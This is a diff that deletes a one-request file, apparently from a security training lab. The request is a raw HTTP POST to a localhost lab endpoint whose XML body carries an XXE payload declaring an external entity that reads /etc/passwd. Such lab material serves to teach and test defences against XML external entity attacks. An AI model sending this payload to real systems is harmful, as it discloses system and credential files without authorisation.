@@ -1,7 +1,0 @@
-﻿POST /api/labs/MM_10/xml HTTP/1.1
-Host: localhost
-Content-Type: application/xml
-Cookie: session=YOUR_SESSION_ID
-Content-Length: 90
-
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
